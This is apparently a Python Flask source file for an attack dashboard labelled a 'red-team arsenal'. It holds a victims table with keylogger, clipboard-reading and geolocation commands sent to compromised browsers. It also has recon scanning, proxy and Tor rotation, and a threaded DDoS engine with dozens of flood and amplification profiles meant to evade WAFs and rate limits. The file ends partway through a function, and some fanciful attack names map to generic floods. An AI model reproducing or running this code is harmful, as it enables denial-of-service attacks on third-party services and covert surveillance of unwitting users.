#!/usr/bin/env python3
"""
APEX NEXUS — production grade load-testing / red-team arsenal
with omni-vector orchestration, adaptive rate control, proxy rotation,
and modern / future bypass techniques.
"""

import os, sqlite3, threading, json, time, uuid, socket, asyncio, random
import urllib.request
from collections import deque, defaultdict
from datetime import datetime, timezone
from functools import wraps
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from flask import (Flask, Response, jsonify, redirect, render_template_string,
                   request, session, url_for)

try:
    import socks  # PySocks — needed for SOCKS5 / Tor
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "redteam-local-demo-secret")

DATABASE = "redteam_dashboard.db"
ADMIN_USER = "admin"
ADMIN_PASSWORD = "nexus123"

# ======================================================================
# Cache-busting
# ======================================================================
@app.after_request
def add_no_cache_headers(response):
    if response.mimetype == "text/html":
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response

# ======================================================================
# Database
# ======================================================================
class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.lock = threading.Lock()
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("""CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY, ip_address TEXT, user_agent TEXT, os_platform TEXT,
            status TEXT DEFAULT 'online', last_seen TEXT, persistence_level TEXT,
            created_at TEXT, updated_at TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command_type TEXT,
            payload TEXT, status TEXT, result TEXT, created_at TEXT, executed_at TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS attacks (
            id TEXT PRIMARY KEY, target_url TEXT, attack_type TEXT,
            duration_seconds INTEGER, status TEXT, stats_json TEXT, created_at TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, level TEXT,
            message TEXT, victim_id TEXT)""")
        conn.commit()
        cols = [r[1] for r in cur.execute("PRAGMA table_info(victims)")]
        if "fingerprint_json" not in cols:
            cur.execute("ALTER TABLE victims ADD COLUMN fingerprint_json TEXT")
            conn.commit()
        conn.close()

    def get_connection(self):
        return sqlite3.connect(self.db_path)

    def log_event(self, level, message, victim_id=None):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("INSERT INTO logs (timestamp, level, message, victim_id) VALUES (?,?,?,?)",
                        (utc_now_iso(), level, message, victim_id))
            c.commit(); c.close()

    def clear_logs(self) -> int:
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("DELETE FROM logs")
            n = cur.rowcount
            cur.execute("DELETE FROM sqlite_sequence WHERE name='logs'")
            c.commit(); c.close()
            return n

    def add_victim(self, data):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            try:
                cur.execute("""INSERT INTO victims
                    (id, ip_address, user_agent, os_platform, status, last_seen,
                     persistence_level, created_at, updated_at, fingerprint_json)
                    VALUES (?,?,?,?,'online',?,?,?,?,?)""",
                    (data["id"], data.get("ip","unknown"), data.get("user_agent","unknown"),
                     data.get("platform","unknown"), utc_now_iso(),
                     data.get("persistence_level","local"), utc_now_iso(), utc_now_iso(),
                     json.dumps(data.get("fingerprint", {}))))
                c.commit(); return True
            except Exception:
                c.rollback(); return False
            finally:
                c.close()

    def update_victim_heartbeat(self, victim_id, fingerprint=None):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            if fingerprint:
                cur.execute("""UPDATE victims SET last_seen=?, status='online',
                    updated_at=?, fingerprint_json=? WHERE id=?""",
                    (utc_now_iso(), utc_now_iso(), json.dumps(fingerprint), victim_id))
            else:
                cur.execute("""UPDATE victims SET last_seen=?, status='online',
                    updated_at=? WHERE id=?""",
                    (utc_now_iso(), utc_now_iso(), victim_id))
            c.commit(); c.close()

    def delete_victim(self, victim_id: str) -> Dict[str, int]:
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("DELETE FROM commands WHERE victim_id=?", (victim_id,))
            cd = cur.rowcount
            cur.execute("DELETE FROM logs WHERE victim_id=?", (victim_id,))
            ld = cur.rowcount
            cur.execute("DELETE FROM victims WHERE id=?", (victim_id,))
            vd = cur.rowcount
            c.commit(); c.close()
            return {"victims_deleted": vd, "commands_deleted": cd, "logs_deleted": ld}

    def get_victims(self):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        rows = [dict(r) for r in cur.fetchall()]; c.close()
        for row in rows:
            analysis = analyze_fingerprint(_safe_json(row.get("fingerprint_json")))
            row["runtime"] = analysis["runtime"]
            row["command_catalog"] = analysis["command_catalog"]
            row["command_catalog_count"] = len(analysis["command_catalog"])
        return rows

    def get_victim_detail(self, victim_id):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
        row = cur.fetchone(); c.close()
        if not row: return None
        result = dict(row)
        fp = _safe_json(row.get("fingerprint_json"))
        analysis = analyze_fingerprint(fp)
        result["fingerprint"] = fp
        result["runtime"] = analysis["runtime"]
        result["command_catalog"] = analysis["command_catalog"]
        return result

    def get_command_history(self, victim_id, limit=50):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM commands WHERE victim_id=? ORDER BY id DESC LIMIT ?",
                    (victim_id, limit))
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def get_logs(self):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 300")
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def add_command(self, victim_id, command_type, payload=""):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("""INSERT INTO commands (victim_id, command_type, payload,
                status, created_at) VALUES (?,?,?,'pending',?)""",
                (victim_id, command_type, payload, utc_now_iso()))
            c.commit(); last = cur.lastrowid; c.close(); return last

    def get_pending_commands(self, victim_id):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM commands WHERE victim_id=? AND status='pending' ORDER BY id ASC",
                    (victim_id,))
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def mark_command_executed(self, command_id, result=""):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("UPDATE commands SET status='executed', result=?, executed_at=? WHERE id=?",
                        (result[:4000], utc_now_iso(), command_id))
            c.commit(); c.close()

    def add_attack(self, target_url, attack_type, duration_seconds):
        aid = f"ATTACK_{uuid.uuid4().hex[:12]}"
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("""INSERT INTO attacks (id, target_url, attack_type,
                duration_seconds, status, stats_json, created_at)
                VALUES (?,?,?,?,'active',?,?)""",
                (aid, target_url, attack_type, duration_seconds, json.dumps({}), utc_now_iso()))
            c.commit(); c.close(); return aid

    def get_attacks(self):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM attacks ORDER BY created_at DESC LIMIT 100")
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def stop_attack(self, attack_id):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("UPDATE attacks SET status='stopped' WHERE id=?", (attack_id,))
            c.commit(); c.close()

db = DatabaseManager(DATABASE)

# ======================================================================
# Utils
# ======================================================================
def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def generate_victim_id() -> str:
    return f"VICTIM_{uuid.uuid4().hex[:16]}"

def _safe_json(raw) -> Dict[str, Any]:
    if not raw: return {}
    try:
        p = json.loads(raw); return p if isinstance(p, dict) else {}
    except Exception:
        return {}

def login_required(fn):
    @wraps(fn)
    def w(*a, **kw):
        if "user" not in session:
            return redirect(url_for("login"))
        return fn(*a, **kw)
    return w

def to_host(v):
    v = (v or "").strip()
    if "://" in v: v = v.split("://", 1)[1]
    return v.split("/")[0].split(":")[0]

def to_url(v):
    v = (v or "").strip()
    return v if "://" in v else "http://" + v

# ======================================================================
# OS-aware command catalog
# ======================================================================
COMMON_COMMANDS = [
    {"type": "collect_data",         "label": "Collect Full Fingerprint"},
    {"type": "get_info",             "label": "Get Basic Info"},
    {"type": "check_persistence",    "label": "Check Persistence Integrity"},
    {"type": "probe_storage_quota",  "label": "Probe Storage Quota"},
    {"type": "list_storage_keys",    "label": "List localStorage Keys"},
    {"type": "get_webgl_info",       "label": "Get GPU / WebGL Info"},
    {"type": "get_connection_info",  "label": "Get Network Connection Info"},
    {"type": "clipboard_read",       "label": "Read Clipboard"},
    {"type": "test_notification",    "label": "Send Test Notification"},
    {"type": "keylogger_start",      "label": "Start Keylogger"},
    {"type": "keylogger_stop",       "label": "Stop Keylogger & Return Captured"},
]

OS_COMMANDS = {
    "Windows": [
        {"type": "get_battery_status", "label": "Get Battery Status (laptop)"},
        {"type": "get_geolocation",    "label": "Get Geolocation"},
        {"type": "fullscreen_test",    "label": "Fullscreen Capability Test"},
    ],
    "macOS": [
        {"type": "get_battery_status", "label": "Get Battery Status"},
        {"type": "get_geolocation",    "label": "Get Geolocation"},
        {"type": "fullscreen_test",    "label": "Fullscreen Capability Test"},
    ],
    "Linux": [
        {"type": "get_geolocation",    "label": "Get Geolocation"},
        {"type": "fullscreen_test",    "label": "Fullscreen Capability Test"},
    ],
    "Android": [
        {"type": "get_battery_status",      "label": "Get Battery Status"},
        {"type": "get_network_info",        "label": "Get Mobile Network Info"},
        {"type": "get_geolocation",         "label": "Get Geolocation"},
        {"type": "vibrate_test",            "label": "Vibration Test"},
        {"type": "screen_orientation_info", "label": "Get Screen Orientation"},
    ],
    "iOS": [
        {"type": "get_battery_status",      "label": "Get Battery Status"},
        {"type": "get_network_info",        "label": "Get Network Info"},
        {"type": "get_geolocation",         "label": "Get Geolocation"},
        {"type": "screen_orientation_info", "label": "Get Screen Orientation"},
    ],
    "Unknown": [],
}

def analyze_fingerprint(fp):
    ua = ((fp.get("userAgent") or fp.get("user_agent") or "") + " " +
          (fp.get("platform") or "")).lower()

    if "windows" in ua or "win32" in ua or "win64" in ua: os_g = "Windows"
    elif "iphone" in ua or "ipad" in ua or "ios" in ua:    os_g = "iOS"
    elif "android" in ua:                                 os_g = "Android"
    elif "mac" in ua or "darwin" in ua:                    os_g = "macOS"
    elif "cros" in ua or "linux" in ua or "x11" in ua:    os_g = "Linux"
    else:                                                  os_g = "Unknown"

    if "edg" in ua:        browser = "Edge"
    elif "opr" in ua or "opera" in ua: browser = "Opera"
    elif "firefox" in ua: browser = "Firefox"
    elif "chrome" in ua:  browser = "Chrome"
    elif "safari" in ua:  browser = "Safari"
    else:                  browser = "Unknown"

    device = "mobile" if any(t in ua for t in ("iphone","ipad","android","mobile")) else "desktop"

    caps = []
    if fp.get("serviceWorkerSupported"): caps.append("service_worker")
    if fp.get("cookiesEnabled"):         caps.append("cookies")
    if fp.get("webGL") or fp.get("webgl"): caps.append("webgl")
    if fp.get("hardwareConcurrency"):    caps.append(f"cores:{fp['hardwareConcurrency']}")

    catalog = [dict(c) for c in COMMON_COMMANDS]
    for c in OS_COMMANDS.get(os_g, []):
        e = dict(c); e["os_specific"] = "true"; catalog.append(e)

    return {
        "runtime": {"os": os_g, "browser": browser, "device": device, "capabilities": caps},
        "command_catalog": catalog,
    }

# ======================================================================
# Recon
# ======================================================================
async def subdomain_enum(domain):
    found = set()
    for word in ["www","mail","ftp","cpanel","webmail","direct","origin","dev","staging",
                 "api","vpn","ns1","ns2","smtp","pop","imap","remote","admin","portal",
                 "old","test","backup","git","jenkins"]:
        try:
            socket.gethostbyname(f"{word}.{domain}"); found.add(f"{word}.{domain}")
        except socket.gaierror: pass
    return sorted(found)

async def port_scan(host):
    ports = [21,22,23,25,53,80,81,110,123,143,443,445,465,587,993,995,1433,2375,
             3306,3389,4444,5432,554,6379,8080,8443,9200,11211,27017]
    out = []
    def chk(p):
        try:
            s = socket.create_connection((host, p), timeout=1.0); s.close()
            out.append({"port": p, "banner": "open"})
        except Exception: pass
    loop = asyncio.get_event_loop()
    for p in ports: loop.run_in_executor(None, chk, p)
    await asyncio.sleep(1.5)
    return sorted(out, key=lambda x: x["port"])

async def origin_ip_locator(domain):
    c = []
    for sub in [f"mail.{domain}", f"direct.{domain}", f"origin.{domain}", f"ftp.{domain}", domain]:
        try:
            c.append({"subdomain": sub, "ip": socket.gethostbyname(sub)})
        except Exception: pass
    return {"candidates": c[:10], "verified_origin": c[:5], "details": c[:10]}

async def vuln_scan(host):
    op = await port_scan(host)
    findings = []
    for p in op:
        if p["port"] in (21,23,2375,6379,27017,9200,11211):
            findings.append({"severity": "HIGH", "port": p["port"],
                             "finding": "Likely exposed service"})
    return {"host": host, "open_ports": op,
            "findings": findings or [{"severity":"INFO","finding":"no obvious issues"}]}

# ======================================================================
# Proxy manager
# ======================================================================
class ProxyManager:
    def __init__(self, proxies=None):
        if proxies is None:
            env = os.environ.get("NEXUS_PROXIES", "")
            proxies = [p.strip() for p in env.split(",") if p.strip()]
        self.proxies = list(proxies)
        self._idx = 0
        self._fails = defaultdict(int)
        self._lock = threading.Lock()

    def next(self):
        with self._lock:
            if not self.proxies: return None
            p = self.proxies[self._idx % len(self.proxies)]
            self._idx += 1
            return p

    def report(self, proxy, ok):
        if not proxy: return
        with self._lock:
            if ok:
                self._fails[proxy] = 0
            else:
                self._fails[proxy] += 1
                if self._fails[proxy] > 10:
                    try: self.proxies.remove(proxy)
                    except ValueError: pass

    def snapshot(self):
        with self._lock:
            return {"total": len(self.proxies),
                    "proxies": list(self.proxies),
                    "fails": dict(self._fails)}

proxy_manager = ProxyManager()

def _http_via_proxy(url, method, headers, body, proxy_url, timeout):
    if proxy_url and proxy_url.startswith("socks") and HAVE_SOCKS:
        try:
            import ssl
            parts = urlparse(proxy_url)
            target = urlparse(url)
            host = target.hostname
            port = target.port or (443 if target.scheme == "https" else 80)
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, parts.hostname, parts.port or 1080)
            s.settimeout(timeout)
            s.connect((host, port))
            if target.scheme == "https":
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=host)
            path = target.path or "/"
            if target.query: path += "?" + target.query
            head = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
            head += [f"{k}: {v}" for k, v in headers.items()]
            head += ["Connection: close", "", ""]
            payload = body or b""
            msg = "\r\n".join(head).encode()
            if payload:
                msg = msg[:-4] + f"\r\nContent-Length: {len(payload)}\r\n\r\n".encode() + payload
            s.sendall(msg)
            data = s.recv(512); s.close()
            return data
        except Exception:
            pass
    if proxy_url and proxy_url.startswith("http"):
        opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}))
    else:
        opener = urllib.request.build_opener()
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    with opener.open(req, timeout=timeout) as resp:
        return resp.read(256)

# ======================================================================
# Adaptive pacer
# ======================================================================
class AdaptivePacer:
    def __init__(self, base_rate, min_rate=1, max_rate=2000):
        self.base = base_rate
        self.min = min_rate; self.max = max_rate
        self.current_rate = base_rate
        self.rtts = deque(maxlen=30)
        self.errors = 0; self.successes = 0
        self._lock = threading.Lock()

    def record(self, rtt=None, error=False):
        with self._lock:
            if error: self.errors += 1
            else:
                self.successes += 1
                if rtt is not None: self.rtts.append(rtt)
            self._recalc()

    def _recalc(self):
        total = self.successes + self.errors
        if total < 10: return
        err_rate = self.errors / total
        if err_rate > 0.30:
            self.current_rate = max(self.min, int(self.current_rate * 0.85))
        elif err_rate < 0.05:
            self.current_rate = min(self.max, int(self.current_rate * 1.05) + 1)
        if len(self.rtts) >= 10:
            half = len(self.rtts) // 2
            a = sum(list(self.rtts)[:half]) / half
            b = sum(list(self.rtts)[half:]) / (len(self.rtts) - half)
            if b > a * 1.5 and self.current_rate > self.min:
                self.current_rate = max(self.min, int(self.current_rate * 0.9))

    def interval(self):
        with self._lock:
            return 1.0 / max(1, self.current_rate)

    def snapshot(self):
        with self._lock:
            return {"rate": self.current_rate, "errors": self.errors,
                    "successes": self.successes}

# ======================================================================
# Attack profiles
# ======================================================================
def _prof(mix, rate=50, payload=512, method="GET", random_port=False):
    return {"mix": mix, "rate": max(1, rate),
            "payload": max(64, min(payload, 1400)),
            "method": method, "random_port": random_port}

HTTP  = {"http": 1.0}
TCP   = {"tcp": 1.0}
UDP   = {"udp": 1.0}
SLOW  = {"slow": 1.0}
MIXED = {"udp": 0.35, "tcp": 0.35, "http": 0.30}

ATTACK_PROFILES = {
    "http_flood":                    _prof(HTTP, rate=100),
    "http_get_post_flood":           _prof(HTTP, rate=120, method="POST"),
    "search_engine_abuse":           _prof(HTTP, rate=10),
    "ai_human_mimic":                _prof(HTTP, rate=5, payload=256),
    "api_centric":                   _prof(HTTP, rate=70),
    "dynamic_cache_line_thrashing":  _prof(HTTP, rate=150, payload=64),
    "semantic_logic_bomb":           _prof(HTTP, rate=40, payload=1400, method="POST"),
    "ssti_concurrency":              _prof(HTTP, rate=50, method="POST"),
    "llm_token_exhaustion":          _prof(HTTP, rate=15, payload=1400, method="POST"),
    "serverless_snowball":           _prof(HTTP, rate=40, method="POST"),
    "supply_chain_choke":            _prof(HTTP, rate=45, method="POST"),
    "application_layer_starvation":  _prof(HTTP, rate=60, method="POST"),
    "encrypted_ddos":                _prof(HTTP, rate=60),
    "cost_based_ddos":               _prof(HTTP, rate=60, method="POST"),
    "cross_tenant_cloud":            _prof(HTTP, rate=80, method="POST"),
    "adversarial_ml_mimicry":        _prof(HTTP, rate=20, payload=1400),
    "websocket_sse_state_flood":     _prof(HTTP, rate=100),
    "energy_oriented_dos":           _prof(HTTP, rate=30, method="HEAD"),
    "login_brute_force":             _prof(HTTP, rate=30, method="POST"),
    "http2_rapid_reset":             _prof(HTTP, rate=250),

    "slowloris":                     _prof(SLOW, rate=3),
    "slow_post_rudy":                _prof(SLOW, rate=2),
    "slow_read_attack":              _prof(SLOW, rate=3),
    "zero_window_tcp":               _prof(SLOW, rate=2),
    "challenge_collapsar":           _prof({"slow": 0.6, "http": 0.4}, rate=20),

    "syn_flood":                     _prof(TCP, rate=300),
    "ack_flood":                     _prof(TCP, rate=300),
    "tcp_ack_fin_rst_flood":         _prof(TCP, rate=200),
    "sack_panic":                    _prof(TCP, rate=150),
    "mptcp_flood":                   _prof(TCP, rate=180),
    "protocol_state_exhaustion":     _prof(TCP, rate=150),
    "side_channel_dos":              _prof(TCP, rate=60),
    "quantum_decoherence":           _prof(TCP, rate=25),
    "post_quantum_handshake":        _prof(TCP, rate=60),
    "lattice_crypto_dos":            _prof(TCP, rate=30),
    "bgp_route_leak":                _prof(TCP, rate=10),
    "hit_and_run":                   _prof(TCP, rate=300),
    "land_attack":                   _prof(TCP, rate=100),
    "winnuke_attack":                _prof(TCP, rate=80),
    "gre_flood":                     _prof(TCP, rate=200),
    "ttl_expiry_attack":             _prof(TCP, rate=100),

    "udp_flood":                     _prof(UDP, rate=400, payload=1024),
    "icmp_flood":                    _prof(UDP, rate=400, payload=64),
    "quic_exhaustion":               _prof(UDP, rate=200, payload=1200),
    "http3_multiplexed_datagram":    _prof(UDP, rate=180, payload=900),
    "optical_switching_congestion":  _prof(UDP, rate=200, payload=1400),
    "neuromorphic_synaptic_overload":_prof(UDP, rate=120, payload=700),
    "energy_oriented_udp":           _prof(UDP, rate=100, payload=256),
    "telephony_tdos":                _prof(UDP, rate=100, payload=256),
    "fragmentation_teardrop":        _prof(UDP, rate=150, payload=128),
    "ping_of_death":                 _prof(UDP, rate=80, payload=1400),
    "jolt2_attack":                  _prof(UDP, rate=120, payload=1400),
    "icmp_redirect_flood":           _prof(UDP, rate=250, payload=64),
    "cross_protocol_logic":          _prof({"udp":0.6,"tcp":0.4}, rate=120),

    "dns_query_flood":               _prof({"dns": 1.0}, rate=150),
    "dns_water_torture":             _prof({"dns": 1.0}, rate=8),
    "dns_tsuname_loop":              _prof({"dns": 1.0}, rate=100),
    "ntp_amplification":             _prof(UDP, rate=300, payload=1200),
    "memcached_amplification":       _prof(UDP, rate=350, payload=1400),
    "ssdp_upnp_amplification":       _prof(UDP, rate=250, payload=1000),
    "snmp_amplification":            _prof(UDP, rate=250, payload=900),
    "chargen_flood":                 _prof(UDP, rate=200, payload=1400),
    "reflection_amplification":      _prof(UDP, rate=350, payload=1200),

    "adaptive_ai":                   _prof(MIXED, rate=80),
    "hybrid_multi_vector":           _prof({"udp":0.3,"tcp":0.3,"http":0.25,"dns":0.15}, rate=150),
    "carpet_bombing":                _prof({"udp":0.5,"tcp":0.5}, rate=250, random_port=True),
    "volumetric_amplification":      _prof(UDP, rate=400, payload=1200),
    "autonomous_p2p_swarm":          _prof({"udp":0.5,"tcp":0.5}, rate=200),
    "bittorrent_flood":              _prof({"udp":0.5,"tcp":0.5}, rate=150),
    "advanced_persistent_dos":       _prof(MIXED, rate=30),
    "smurf_attack":                  _prof(UDP, rate=350, payload=64),
    "yo_yo_attack":                  _prof(MIXED, rate=90),

    "wasm_compilation_bomb":         _prof(HTTP, rate=15, payload=1400),
    "wasm_memory_bomb":              _prof(HTTP, rate=8,  payload=1400),
    "llm_prompt_bomb":               _prof(HTTP, rate=10, payload=1400, method="POST"),
    "tensorflow_protobuf_overflow":  _prof(HTTP, rate=20, payload=1400, method="POST"),
    "rpc_node_flood":                _prof(HTTP, rate=60, method="POST"),
    "smart_contract_gas_bomb":       _prof(HTTP, rate=20, method="POST"),
    "mev_mempool_spam":              _prof(HTTP, rate=40, method="POST"),
    "edge_function_chain":           _prof(HTTP, rate=30),
    "geo_distributed_edge":          _prof(HTTP, rate=40),
}

# ======================================================================
# Omni-vector escalation ladder
# ======================================================================
OMNI_VECTOR_ORDER: List[Tuple[str, str]] = [
    ("http_flood",                 "Baseline HTTP GET flood — reveals rate limits"),
    ("search_engine_abuse",        "Slow crawl-style requests — mimics search bots"),
    ("ai_human_mimic",             "Human-timed HTTP with jitter — evades behavioural filters"),
    ("api_centric",                "REST API endpoints — burns backend data tier"),
    ("dynamic_cache_line_thrashing","Cache-busting queries — forces origin hits"),
    ("semantic_logic_bomb",        "Parser-heavy JSON/XML POST bodies — CPU burn"),
    ("llm_token_exhaustion",       "Long-prompt POST — drains inference budget"),
    ("llm_prompt_bomb",            "Recursive/expanding prompts — 1000× compute"),
    ("tensorflow_protobuf_overflow","Malformed protobuf — TF Serving deserial DoS"),
    ("wasm_compilation_bomb",      "Cache-busted .wasm fetches — recompile storm"),
    ("wasm_memory_bomb",           "Payload triggers 4GB allocation per request"),
    ("slowloris",                  "Slow header dribble — indefinite socket hold"),
    ("slow_post_rudy",             "Slow chunked POST — beats rate limits"),
    ("slow_read_attack",           "Slow-read — TCP zero-window pressure"),
    ("challenge_collapsar",        "Mixed slow+burst — defeats JS challenges"),
    ("zero_window_tcp",            "Zero-window TCP — buffer leak"),
    ("http2_rapid_reset",          "HTTP/2 RST flood (CVE-2023-44487)"),
    ("websocket_sse_state_flood",  "Persistent WebSocket/SSE — exhausts slots"),
    ("http3_multiplexed_datagram", "QUIC datagram burst — CDN-friendly"),
    ("post_quantum_handshake",     "Kyber/Dilithium handshake exhaustion"),
    ("lattice_crypto_dos",         "Lattice-crypto CPU exhaustion"),
    ("syn_flood",                  "Half-open SYN — conntrack exhaustion"),
    ("ack_flood",                  "Bare ACK flood — firewall memory"),
    ("tcp_ack_fin_rst_flood",      "Mixed TCP flag flood — filter evasion"),
    ("sack_panic",                 "SACK abuse (CVE-2019-11477 lineage)"),
    ("mptcp_flood",                "MPTCP state explosion"),
    ("protocol_state_exhaustion",  "Generic TCP state flood"),
    ("udp_flood",                  "Raw UDP volumetric"),
    ("icmp_flood",                 "ICMP echo flood"),
    ("quic_exhaustion",            "QUIC Initial-packet flood"),
    ("fragmentation_teardrop",     "Fragmentation overlap"),
    ("ping_of_death",              "Max-size ICMP datagram"),
    ("jolt2_attack",               "Fragment offset overflow"),
    ("dns_query_flood",            "DNS recursive flood"),
    ("ntp_amplification",          "NTP monlist reflection"),
    ("memcached_amplification",    "Memcached get reflection"),
    ("ssdp_upnp_amplification",    "SSDP / UPnP discovery reflection"),
    ("snmp_amplification",         "SNMP getbulk reflection"),
    ("chargen_flood",              "Chargen reflection"),
    ("dns_water_torture",          "Random-subdomain DNS flood"),
    ("hybrid_multi_vector",        "UDP + TCP + HTTP simultaneous"),
    ("carpet_bombing",             "Random-port spray"),
    ("volumetric_amplification",   "Amplification-heavy blast"),
    ("reflection_amplification",   "Reflection-heavy blast"),
    ("adaptive_ai",                "Rate-adaptive blended vector"),
    ("geo_distributed_edge",       "Multi-POP edge pressure"),
    ("edge_function_chain",        "Trigger chains of edge functions"),
    ("smart_contract_gas_bomb",    "Gas-exhaust calls to Web3 RPC"),
    ("mev_mempool_spam",           "Mempool / RPC spam"),
    ("rpc_node_flood",             "ETH/Polkadot JSON-RPC flood"),
    ("autonomous_p2p_swarm",       "Botnet-style P2P burst"),
    ("advanced_persistent_dos",    "Sustained low-and-slow APDoS"),
    ("yo_yo_attack",               "Pulse high/low to trigger autoscaler"),
]

# ======================================================================
# UA / path / verb pools
# ======================================================================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
]
PATH_POOL = ["/", "/index.html", "/login", "/api/v1/status", "/api/v1/items",
             "/search?q=", "/assets/app.js", "/assets/style.css", "/health",
             "/.well-known/security.txt", "/api/users?page={n}", "/graphql",
             "/rpc", "/api/v1/tx", "/api/v1/prompt", "/static/app.wasm?cb={n}"]
WAF_VERBS = ["GET", "POST", "VERB", "DEBUG", "TRACE", "PROPFIND",
             "REPORT", "SEARCH", "MKCOL", "OPTIONS", "PATCH", "X-TOP-SECRET"]

def _dns_query_packet(domain: str) -> bytes:
    parts = domain.strip(".").split(".")
    qname = b"".join(bytes([len(p)]) + p.encode() for p in parts if p) + b"\x00"
    txid = random.randint(0, 65535).to_bytes(2, "big")
    return txid + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" \
           + qname + b"\x00\x01" + b"\x00\x01"

# ======================================================================
# Engine
# ======================================================================
class DDoSEngine:
    def __init__(self):
        self._attacks: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()

    def start_attack(self, attack_id, target_url, attack_type,
                     duration_seconds, threads=50, options=None):
        options = options or {}
        if attack_type in ("omni_vector", "omni_sequential"):
            return self._start_omni(attack_id, target_url, attack_type,
                                    duration_seconds, threads, options)
        return self._start_single(attack_id, target_url, attack_type,
                                  duration_seconds, threads, options)

    def stop_attack(self, attack_id):
        with self._lock:
            rec = self._attacks.get(attack_id)
            if not rec: return False
            rec["stop"].set()
            rec["stats"]["status"] = "stopped"
            return True

    def get_attack_status(self, attack_id):
        with self._lock:
            rec = self._attacks.get(attack_id)
            if not rec: return {"error": "unknown attack", "attack_id": attack_id}
            stats = dict(rec["stats"])
            pacer = rec.get("pacer")
        elapsed = max(0.001, time.time() - stats["started_at"])
        stats["elapsed"] = round(elapsed, 2)
        stats["pps"] = round(stats["packets_sent"] / elapsed, 1)
        stats["bps"] = round(stats["bytes_sent"] / elapsed, 1)
        stats["remaining"] = max(0, round(rec["duration"] - elapsed))
        if pacer: stats["adaptive"] = pacer.snapshot()
        return stats

    def _start_single(self, attack_id, target_url, attack_type, duration, threads, options):
        profile = ATTACK_PROFILES.get(attack_type, ATTACK_PROFILES["http_flood"])
        ctx = self._build_ctx(attack_id, target_url, attack_type, duration, profile, options)
        threads = max(1, min(threads, 256))
        for _ in range(threads):
            threading.Thread(target=self._worker_single, args=(ctx,), daemon=True).start()
        self._start_watchdog(ctx)
        return ctx["stats"]

    def _start_omni(self, attack_id, target_url, attack_type, duration, threads, options):
        schedule = [(name, ATTACK_PROFILES[name])
                    for name, _desc in OMNI_VECTOR_ORDER
                    if name in ATTACK_PROFILES]
        if not schedule:
            schedule = [("http_flood", ATTACK_PROFILES["http_flood"])]
        base_profile = {"mix": {"http": 1.0}, "rate": 60, "payload": 512,
                        "method": "GET", "random_port": False}
        ctx = self._build_ctx(attack_id, target_url, attack_type, duration,
                              base_profile, options)
        ctx["schedule"] = schedule
        ctx["phase_duration"] = duration / max(1, len(schedule))
        threads = max(1, min(threads, 256))
        if attack_type == "omni_sequential":
            for _ in range(threads):
                threading.Thread(target=self._worker_omni_phased,
                                 args=(ctx,), daemon=True).start()
        else:
            for _ in range(threads):
                threading.Thread(target=self._worker_omni_simultaneous,
                                 args=(ctx,), daemon=True).start()
        self._start_watchdog(ctx)
        return ctx["stats"]

    def _build_ctx(self, attack_id, target_url, attack_type, duration, profile, options):
        url = to_url(target_url)
        host = to_host(target_url)
